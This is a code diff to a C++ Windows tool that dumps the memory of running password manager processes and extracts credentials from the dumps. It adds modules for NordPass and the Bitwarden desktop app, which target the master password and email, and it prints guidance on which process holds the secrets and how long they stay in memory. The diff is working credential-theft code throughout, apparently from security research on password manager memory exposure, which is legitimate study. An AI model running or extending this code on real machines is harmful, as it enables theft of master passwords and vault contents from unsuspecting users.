@@ -24,6 +24,8 @@
 #include "../keeper/getCredskeeper1.h"
 #include "../keeper/getCredskeeper2.h"
 #include "../keeper/getCredskeeper3.h"
+#include "../nordpass/app/getCredsnordpass1.h"
+#include "../nordpass/app/getCredsnordpass2.h"
 #include "../dashlane/getCredsdashlaneEntries.h"
 #include "../dashlane/getCredsdashlaneMaster.h"
 #include "../lastpass/getCredslastpassEntries.h"
@@ -35,6 +37,8 @@
 #include "../roboform/app/getCredsroboformapp3.h"
 #include "../bitwarden/plugin/getCredsbitwardenPluginChrome.h"
 #include "../bitwarden/plugin/getCredsbitwardenPluginChrome2.h"
+#include "../bitwarden/app/getCredsbitwardenApp1.h"
+#include "../bitwarden/app/getCredsbitwardenApp2.h"
 #include "../norton/getCredsnorton.h"
 #include "../norton/getCredsnorton2.h"
 #include "../bitdefender/getCredsbitdefender.h"
@@ -78,7 +82,7 @@ int checkApps() {
 
     std::cout << "Enter the name of the password manager (accepted values, 1password, avira, \n";
     std::cout << "bitdefender, bitwarden, brave, chrome, dashlane, firefox, ironvest, kaspersky, keeper,\n";
-    std::cout << "lastpass, msedge, norton, passwarden, passwordboss, roboform ): ";
+    std::cout << "nordpass, lastpass, msedge, norton, passwarden, passwordboss, roboform ): ";
     std::cin >> userInput;
     
     wchar_t currentDir[MAX_PATH];
@@ -370,6 +374,62 @@ int checkApps() {
         getCredskeeper3(fileInput);
         std::cout << "Done!\n";
         std::cout << "If zero credentials were found, ensure that the app is up and running!\n";
+    }
+
+    //nordpass
+    if (userInput == "nordpass") {
+        std::cout << "User input matches 'nordpass'.\n";
+        std::cout << "Only the relevant master password and username (email address) should be available.\n";
+        const char* processName = "NordPass.exe";
+        std::vector<DWORD> pids;
+
+        if (mode == "fast") {
+            // Step 1: Find PIDs by process name
+            pids = FindPIDsByProcessName(processName);
+
+            if (!pids.empty())
+            {
+                // Step 2: Get Private Working Set sizes for the found PIDs
+                std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);
+
+                // Step 3: Find the PID with the second-largest Private Working Set size
+                DWORD secondLargestPID = FindSecondPID(pidSizePairs);
+
+                if (secondLargestPID != 0)
+                {
+                    // Step 4: Create a dump file for the process with the second-largest size
+                    saveDump(secondLargestPID);
+                }
+                else
+                {
+                    std::cerr << "No process with the second-largest Private Working Set size found." << std::endl;
+                }
+            }
+            else
+            {
+                std::cerr << "No processes with the specified name found." << std::endl;
+            }
+            fileInput = "app.dmp";
+        }
+
+        if (mode == "full") {
+
+            pids = FindPIDsByProcessName(processName);
+
+            for (DWORD pid : pids) {
+                std::wcout << L"Process PID: " << pid << std::endl;
+                createFileFromMultiPIDs(pid);
+            }
+
+            fileInput = "app.dmp";
+        }
+
+        std::cout << "Searching for master password (1/2).\n";
+        getCredsnordpass1(fileInput);
+        std::cout << "Searching for master username (2/2).\n";
+        getCredsnordpass2(fileInput);
+        std::cout << "Done!\n";
+        std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
     }
 
     //passwarden
@@ -1006,88 +1066,155 @@ int checkApps() {
     //bitwarden
     if (userInput == "bitwarden") {
         std::cout << "User input matches 'bitwarden'.\n";
-        std::cout << "In this browser plugin, for Chrome the second largest process is needed.\n";
-        std::cout << "For Firefox the third largest process is needed.\n";
-        std::cout << "In Firefox, all credentials should be available (master pass, entries, etc).\n";
-        std::cout << "In Chrome, only entries are available.\n";
-        std::cout << "Note that in case of Chrome, credentials are removed after some time (i.e., 10 min).\n";
-        std::cout << "To gain again access to entries in Chrome, a browser interaction with the plugin must be made.\n";
-        std::cout << "For instance, this can happen when the user visits any login screen.\n";
-        std::cout << "For now, this only works with Chrome.\n";
-        const char* processName = "chrome.exe";
+        std::cout << "Enter 0 if it is Bitwarden browser plugin, otherwise enter 1 (app): \n";
+        std::string userInput2;
+        std::cin >> userInput2;
 
-        wchar_t username[256];
-        DWORD usernameSize = sizeof(username) / sizeof(username[0]);
+        if (userInput2 == "0") {
 
-        if (GetUserNameW(username, &usernameSize)) {
-            // Replace this value with the extension name you want to check
-            std::wstring extensionName = L"nngceckbapebfimnlniiiahkandclblb";
+            std::cout << "In this browser plugin, for Chrome the second largest process is needed.\n";
+            std::cout << "For Firefox the third largest process is needed.\n";
+            std::cout << "In Firefox, all credentials should be available (master pass, entries, etc).\n";
+            std::cout << "In Chrome, only entries are available.\n";
+            std::cout << "Note that in case of Chrome, credentials are removed after some time (i.e., 10 min).\n";
+            std::cout << "To gain again access to entries in Chrome, a browser interaction with the plugin must be made.\n";
+            std::cout << "For instance, this can happen when the user visits any login screen.\n";
+            std::cout << "For now, this only works with Chrome.\n";
+            const char* processName = "chrome.exe";
 
-            if (findPlugin(username, extensionName)) {
-                std::wcout << L"Directory exists!" << std::endl;
+            wchar_t username[256];
+            DWORD usernameSize = sizeof(username) / sizeof(username[0]);
+
+            if (GetUserNameW(username, &usernameSize)) {
+                // Replace this value with the extension name you want to check
+                std::wstring extensionName = L"nngceckbapebfimnlniiiahkandclblb";
+
+                if (findPlugin(username, extensionName)) {
+                    std::wcout << L"Directory exists!" << std::endl;
+                }
+                else {
+                    std::wcout << L"Directory does not exist." << std::endl;
+                    std::wcout << L"Stop execution.\n" << std::endl;
+                    return 1;
+                }
             }
             else {
-                std::wcout << L"Directory does not exist." << std::endl;
-                std::wcout << L"Stop execution.\n" << std::endl;
+                std::wcerr << L"Failed to get the current user's login name." << std::endl;
                 return 1;
             }
-        }
-        else {
-            std::wcerr << L"Failed to get the current user's login name." << std::endl;
-            return 1;
-        }
 
-        
-        // Step 1: Find PIDs by process name
-        std::vector<DWORD> pids;
 
-        if (mode == "fast") {
+            // Step 1: Find PIDs by process name
+            std::vector<DWORD> pids;
 
-            pids = FindPIDsByProcessName(processName);
+            if (mode == "fast") {
 
-            if (!pids.empty())
-            {
-                // Step 2: Get Private Working Set sizes for the found PIDs
-                std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);
+                pids = FindPIDsByProcessName(processName);
 
-                // Step 3: Find the PID with the second-largest Private Working Set size
-                DWORD secondLargestPID = FindSecondPID(pidSizePairs);
-
-                if (secondLargestPID != 0)
+                if (!pids.empty())
                 {
-                    // Step 4: Create a dump file for the process with the second-largest size
-                    saveDump(secondLargestPID);
+                    // Step 2: Get Private Working Set sizes for the found PIDs
+                    std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);
+
+                    // Step 3: Find the PID with the second-largest Private Working Set size
+                    DWORD secondLargestPID = FindSecondPID(pidSizePairs);
+
+                    if (secondLargestPID != 0)
+                    {
+                        // Step 4: Create a dump file for the process with the second-largest size
+                        saveDump(secondLargestPID);
+                    }
+                    else
+                    {
+                        std::cerr << "No process with the second-largest Private Working Set size found." << std::endl;
+                    }
                 }
                 else
                 {
-                    std::cerr << "No process with the second-largest Private Working Set size found." << std::endl;
+                    std::cerr << "No processes with the specified name found." << std::endl;
                 }
+                fileInput = "app.dmp";
             }
-            else
-            {
-                std::cerr << "No processes with the specified name found." << std::endl;
+
+            if (mode == "full") {
+                pids = FindPIDsByProcessName(processName);
+
+                for (DWORD pid : pids) {
+                    std::wcout << L"Process PID: " << pid << std::endl;
+                    createFileFromMultiPIDs(pid);
+                }
+
+                fileInput = "app.dmp";
             }
-            fileInput = "app.dmp";
+
+            std::cout << "Searching for entries (1/2).\n";
+            getCredsbitwardenPluginChrome(fileInput);
+            std::cout << "Done!\n";
+            std::cout << "Searching for entries (2/2).\n";
+            getCredsbitwardenPluginChrome2(fileInput);
+            std::cout << "Done!\n";
+            std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
         }
 
-        if (mode == "full") {
-            pids = FindPIDsByProcessName(processName);
+        if (userInput2 == "1") {
 
-            for (DWORD pid : pids) {
-                std::wcout << L"Process PID: " << pid << std::endl;
-                createFileFromMultiPIDs(pid);
+                std::cout << "For this app, the first largest process is needed.\n";
+                std::cout << "The master password and username (email address) should be available.\n";
+                std::cout << "It should be noted that the app clears master password from the memory after some time (appox. 10 min).\n";
+                const char* processName = "Bitwarden.exe";
+
+               // Step 1: Find PIDs by process name
+                std::vector<DWORD> pids;
+
+                if (mode == "fast") {
+
+                    pids = FindPIDsByProcessName(processName);
+
+                    if (!pids.empty())
+                    {
+                        // Step 2: Get Private Working Set sizes for the found PIDs
+                        std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);
+
+                        // Step 3: Find the PID with the first-largest Private Working Set size
+                        DWORD firstLargestPID = FindFirstPID(pidSizePairs);
+
+                        if (firstLargestPID != 0)
+                        {
+                            // Step 4: Create a dump file for the process with the first-largest size
+                            saveDump(firstLargestPID);
+                        }
+                        else
+                        {
+                            std::cerr << "No process with the second-largest Private Working Set size found." << std::endl;
+                        }
+                    }
+                    else
+                    {
+                        std::cerr << "No processes with the specified name found." << std::endl;
+                    }
+                    fileInput = "app.dmp";
+                }
+
+                if (mode == "full") {
+                    pids = FindPIDsByProcessName(processName);
+
+                    for (DWORD pid : pids) {
+                        std::wcout << L"Process PID: " << pid << std::endl;
+                        createFileFromMultiPIDs(pid);
+                    }
+
+                    fileInput = "app.dmp";
+                }
+
+                std::cout << "Searching for master password (1/2).\n";
+                getCredsbitwardenApp1(fileInput);
+                std::cout << "Done!\n";
+                std::cout << "Searching for master username (2/2).\n";
+                getCredsbitwardenApp2(fileInput);
+                std::cout << "Done!\n";
+                std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
             }
 
-            fileInput = "app.dmp";
-        }
-
-        std::cout << "Searching for entries (1/2).\n";
-        getCredsbitwardenPluginChrome(fileInput);
-        std::cout << "Done!\n";
-        std::cout << "Searching for entries (2/2).\n";
-        getCredsbitwardenPluginChrome2(fileInput);
-        std::cout << "Done!\n";
-        std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
     }
 
 
@@ -1486,7 +1613,7 @@ int checkApps() {
     //Just to be sure
     if (userInput != "1password" && userInput != "firefox" && userInput != "dashlane"
         && userInput != "keeper" && userInput != "chrome" && userInput != "brave"
-        && userInput != "msedge" && userInput != "lastpass" && userInput != "roboform"
+        && userInput != "msedge" && userInput != "lastpass" && userInput != "nordpass" && userInput != "roboform"
         && userInput != "bitwarden" && userInput != "norton" && userInput != "bitdefender"
         && userInput != "ironvest" && userInput != "passwarden" && userInput != "avira"
         && userInput != "passwordboss" && userInput != "kaspersky") {
